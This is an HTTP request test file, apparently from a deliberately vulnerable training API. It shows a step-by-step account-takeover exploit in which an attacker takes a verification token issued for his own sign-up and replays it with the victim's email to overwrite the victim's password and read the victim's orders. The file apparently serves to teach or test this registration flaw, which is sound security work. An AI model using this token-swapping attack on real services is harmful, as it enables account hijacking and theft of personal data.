# @import ../common/setup.http
@host = {{base_host}}/v106
@mailpit = http://127.0.0.1:8025/api/v1

# Sandy opens the platform to self-registration!

{{
  await resetDB("v106");
  console.info("Database reset to clean state");
}}

### SpongeBob is a registered user, so he can login as usual
GET /account/info
Authorization: {{spongebob_auth_email}}

?? status == 200

### Plankton tries to register as SpongeBob, but this fails because the email is already taken
POST /auth/register
Content-Type: application/json

{
    "email": "spongebob@krusty-krab.sea"
}

?? status == 400
?? js response.parsedBody.message == email already taken


### So, Plankton registers a sock puppet account instead
POST /auth/register
Content-Type: application/json

{ "email": "plankton.jr@chum-bucket.sea" }

?? status == 200


### This request succeeds and sends a verification email to provided email
GET {{mailpit}}/messages?limit=1

# The last message is the one we want
@message_id = {{response.parsedBody.messages.at(-1).ID}}


### Extract the verification token from the email
GET {{mailpit}}/message/{{message_id}}

@token = {{response.parsedBody.Text.match(/token=([a-zA-Z0-9\-_.]+)/)[1]}}


### Plankton submits the verification token but specifies SpongeBob's email, hijacking his account
POST /auth/register
Content-Type: application/json

{
    "token": "{{token}}",
    "email": "spongebob@krusty-krab.sea",
    "password": "hijacked",
    "name": "SpongeBob"
}

?? status == 200
?? js response.parsedBody.email == spongebob@krusty-krab.sea


### Plankton can now login as SpongeBob and access his orders history
GET /orders
Authorization: Basic spongebob@krusty-krab.sea:hijacked

?? status == 200
?? js response.parsedBody.length == 1
?? js response.parsedBody.at(0).user_id == spongebob@krusty-krab.sea
